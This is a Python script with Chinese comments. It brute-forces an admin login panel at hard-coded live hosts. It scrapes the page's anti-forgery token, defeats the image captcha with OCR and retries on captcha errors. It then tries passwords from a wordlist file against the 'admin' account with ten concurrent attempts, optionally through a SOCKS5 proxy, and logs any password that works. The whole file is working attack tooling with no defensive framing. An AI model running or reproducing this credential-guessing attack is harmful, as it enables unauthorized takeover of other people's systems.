import asyncio
import aiohttp
from aiohttp_socks import SocksConnector
import time
import json
import common
import requests
import traceback
import re, os, uuid, datetime, stat
from bs4 import BeautifulSoup
from logger import MyLogger

base_captcha = "captcha"

# base_url = "http://www.ximimim.top:1008"
base_url = "https://154.91.255.180"
# base_url = "http://www.bmavi.top"
# base_url = "https://facai362.top"
route_login = "/admin/common/login.shtml"
route_captcha = "/captcha.shtml"

urls = [
    f"https://www.cnblogs.com/#p{page}"
    for page in range(1, 2)
]
session_request = requests.Session()
session_request.headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299'
}

# 信号量控制并发数量
semaphore = asyncio.Semaphore(10)
ACCOUNT_FILE_NAME = "account.txt"
# 获取文件最多行数
FILE_NUM_LINES = 20
# 验证码失败尝试次数
ATTEMPT_NUM = 3
# 平台地址
PLATFORM_ADDRESS = common.get_host_port(base_url)
# 是否手动设置cookie
IS_COOKIE = False
# 是否手动设置ssl进行忽略
IS_VERIFY_SSL = False
# 部分网站无法访问加入代理模式可以解决
IS_SOCKS5 = False  # 默认不开启socks5代理
# socks5_proxy_url = 'socks5://[USERNAME:PASSWORD@]PROXY_HOST:PROXY_PORT' 带密码
socks5_proxy_url = 'socks5://127.0.0.1:10808'  # 不带密码
socks5_connector = SocksConnector.from_url(socks5_proxy_url)
aiohttp_cookies = {'PHPSESSID': 'vj82u5m4j1nt7l7fo813rg1781'}
# 判断URL是否是HTTPS链接地址
IS_HTTPS = common.is_https(base_url)
# 生成平台对应目录
common.create_platform_address(os.getcwd(), common.ATTACHMENT, PLATFORM_ADDRESS)
# 日志记录器-按照平台地址区分
my_logger = MyLogger(PLATFORM_ADDRESS)


class MergedConnector(aiohttp.BaseConnector):
    """
    代码示例可能对的
    connector1 = aiohttp.TCPConnector()
    connector2 = aiohttp.SSLConnector(sslcontext=ssl.create_default_context())
    merged_connector = MergedConnector(connector1, connector2)
    """

    def __init__(self, *connectors):
        super().__init__()
        self.connectors = connectors

    async def _create_connection(self, req, traces, timeout=None, client_error=asyncio.TimeoutError, **kwargs):
        """
        将请求分配给每个连接器，并返回第一个成功创建连接的结果。
        """
        for connector in self.connectors:
            try:
                return await connector._create_connection(req, traces, timeout, client_error, **kwargs)
            except aiohttp.ClientConnectorError:
                pass
        raise aiohttp.ClientConnectorError('Failed to connect to any of the specified connectors.')

    async def connect(self, req, *args, **kwargs):
        """
        将请求分配给每个连接器，并返回第一个成功建立连接的会话对象。
        """
        for connector in self.connectors:
            try:
                return await connector.connect(req, *args, **kwargs)
            except aiohttp.ClientConnectorError:
                pass
        raise aiohttp.ClientConnectorError('Failed to connect to any of the specified connectors.')


async def get_captcha_code(session: aiohttp.ClientSession):  # 获取到正确验证码
    # 创建目录
    dir_path = common.cur_create_dir()
    # 生成图片名称
    uuid = common.create_uuid_png_name()
    # 获取验证码并识别
    captcha_code = await get_captcha_image(base_url + route_captcha, dir_path + "/" + uuid, session)
    return captcha_code


async def get_captcha_image(url, img_path_name, session: aiohttp.ClientSession):  # 获取验证码图片并且识别转为可输入的数字或者字母
    # 获取图片
    zh_model = re.compile(u'[\u4e00-\u9fa5]')  # u4e00 和 u9fa5 是中文的两个端点
    # 异步写入
    async with session.get(url) as resp:
        with open(img_path_name, 'wb') as file:
            while True:
                chunk = await resp.content.read(1024)
                if not chunk:
                    break
                file.write(chunk)
        res = common.img_ocr(img_path_name)
        # # 判断字符串是否仅由数字字符或者字母数字组成
        if res and ((res.isdigit() or res.isalnum()) and not zh_model.search(res)):
            return res
        else:
            print("get_captcha_image方法识别有误,尝试从新中... ", res)
            return await get_captcha_image(url, img_path_name, session)


async def login_token(session: aiohttp.ClientSession):
    async with session.get(base_url + route_login) as resp:
        result = await resp.text()
        soup = BeautifulSoup(result, 'html.parser')
        # # 获取 __token__ 的值
        token = soup.find('input', {'name': '__token__'}).get('value')
        return token


async def login_attack(session: aiohttp.ClientSession, login: common.LoginInfo):  # ip.addr == 104.233.197.195 and http
    # 请求参数
    param = "name={0}&password={1}&captcha={2}&__token__={3}".format(login.username,
                                                                     login.password, login.captcha, login.token)

    # print("请求参数", param)
    header = {
        'X-Requested-With': 'XMLHttpRequest',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
        # 'Cookie': 'PHPSESSID=gq0npeainecd9vn5si0vqb08g0'
    }
    #  + secrets.token_hex(13),
    # data = urllib3.urlencode(postData)
    # res = session.post(url=base_url + route_login, data=data, headers=header, verify=False)
    async with session.post(url=base_url + route_login, data=param, headers=header) as resp:
        text = await resp.text()
        result = json.loads(text)
        # print("login response success", result)
        return result


# 协程函数
async def async_craw(row, password):
    async with semaphore:
        try:
            # 部分https地址无法自动设置cookie 需要手动设置一下
            # header = {'Cookie': 'PHPSESSID=vj82u5m4j1nt7l7fo813rg1781'}
            # 是否进行手动设置Cookie
            cookies = {'PHPSESSID': common.create_random_26()} if IS_COOKIE else None
            # 如果是https链接 读取配置进行是否忽略ssl证书校验
            connector = aiohttp.TCPConnector(verify_ssl=False) if IS_VERIFY_SSL else None if IS_HTTPS else None
            # 是否进行socks5代理
            if IS_SOCKS5:
                connector = socks5_connector
            # 没有找到此方法后续在查询资料
            # multi_connector = aiohttp.MultiConnector(connectors=[socks5_connector, tcp_connector])
            # 没有找到此方法后续在查询资料
            # connector = aiohttp.Connector.combine(tcp_connector, socks5_connector)
            # tcp_connector = aiohttp.TCPConnector(ssl=False, verify_ssl=False, limit=None, proxy=socks5_connector)
            async with aiohttp.ClientSession(connector=connector, cookies=cookies) as session:
                # print('获取数据中...........')
                # 获取登录地址中的token
                token = await login_token(session)
                # print(token)
                captcha = await get_captcha_code(session)
                # print("captcha_code=", captcha)
                # 构造信息
                login_info = common.LoginInfo()
                login_info.full_property_data("admin", password, token, captcha)
                res_dict = await login_attack(session, login_info)  # 登录数据返回结果
                login_resp = common.LoginResponse()
                # 返回结果反射到LoginResponse属性中
                common.dict_to_obj(res_dict, login_resp)
                # print(res_dict)
                # 校验验证码错误 尝试再次登录
                # login_resp.msg = "验证码不正确"
                captcha_record_nums = 1  # 记录验证码获取计词
                # 日志记录对象
                log_extra = {'username': login_info.username, 'password': login_info.password}
                if "验证码不正确" in login_resp.msg:
                    await login_attempt(session, login_info, login_resp, captcha_record_nums, row)
                else:
                    if "密码错误" in login_resp.msg:
                        await my_logger.warning(f'该账号密码错误,所在文件第{row}行', log_extra)
                    else:
                        if login_resp.code == 1:
                            await my_logger.info(f'登录成功,该密码所在文件第{row}行', log_extra)
                # await asyncio.sleep(5)  # 等待五秒
                # if "验证码不正确" in login_resp.msg:
                #     # 只允许限定次数内重新获取验证码 5 <= 100
                #     if captcha_record_nums <= ATTEMPT_NUM:
                #         captcha = await get_captcha_code(session)
                #         captcha_record_nums += 1
                #         print("captcha get number", captcha_record_nums)
                #         # print("captcha_code=", captcha)
                #         if captcha_record_nums == 3:
                #             # 重新设置验证码
                #             login_info.set_captcha(captcha)
                #         res_dict = await login_attack(session, login_info)  # 登录数据返回结果
                #         print(res_dict)
                #         login_resp = common.LoginResponse()
                #     else:
                #         print("该{}账号已超过获取次数".format("admin"))
        except aiohttp.ClientError as error:
            my_logger.warning('网络出错|程序异常|手动排查', log_extra)
            print(f'Request failed: {str(error)}')
            traceback.print_exc()  # 打印完整的错误堆栈信息


# 尝试登录多次
async def login_attempt(session: aiohttp.ClientSession, login_info: common.LoginInfo, login_resp: common.LoginResponse,
                        captcha_record_nums, file_row_number):
    log_extra = {'username': login_info.username, 'password': login_info.password}
    if "验证码不正确" in login_resp.msg:
        # 只允许限定次数内重新获取验证码 5 <= 100
        if captcha_record_nums <= ATTEMPT_NUM:
            captcha = await get_captcha_code(session)
            captcha_record_nums += 1
            print("captcha get number", captcha_record_nums)
            # print("captcha_code=", captcha)
            # if captcha_record_nums == 4:
            # 重新设置验证码
            login_info.set_captcha(captcha)
            res_dict = await login_attack(session, login_info)  # 登录数据返回结果
            # print(res_dict)
            common.dict_to_obj(res_dict, login_resp)
            return await login_attempt(session, login_info, login_resp, captcha_record_nums, file_row_number)
        else:
            await my_logger.warning(f'该账号已超过获取{ATTEMPT_NUM}次验证码,直接返回', log_extra)
    else:
        if "密码错误" in login_resp.msg:
            await my_logger.warning(f'该账号密码错误,所在文件第{file_row_number}行', log_extra)
        else:
            if login_resp.code == 1:
                await my_logger.info(f'登录成功,该密码所在文件第{file_row_number}行', log_extra)


def start_task():
    start = time.time()

    loop = asyncio.get_event_loop()

    tasks = [loop.create_task(async_craw(url)) for url in urls]  # task任务

    loop.run_until_complete(asyncio.wait(tasks))  # 等待所有的任务完成

    end = time.time()
    print("协程 async 总耗时:", end - start, "seconds")


def start_file_account():
    start = time.time()
    tasks = []
    loop = asyncio.get_event_loop()
    with open(ACCOUNT_FILE_NAME, "r") as f:
        for i in range(FILE_NUM_LINES):
            password = f.readline().strip()
            task = loop.create_task(async_craw(i + 1, password))
            tasks.append(task)
    # 等待所有的任务完成
    loop.run_until_complete(asyncio.wait(tasks))
    end = time.time()
    print("协程 async 总耗时:", end - start, "seconds")


def main():
    # 获取平台登陆地址
    # my_logger.info(f'该账号已超过获取{ATTEMPT_NUM}次验证码,直接返回', {'username': 'admin', 'password': '123456'})
    # return
    print("平台登陆地址", base_url + route_login)
    start_file_account()
    # start_task()


if __name__ == "__main__":
    main()
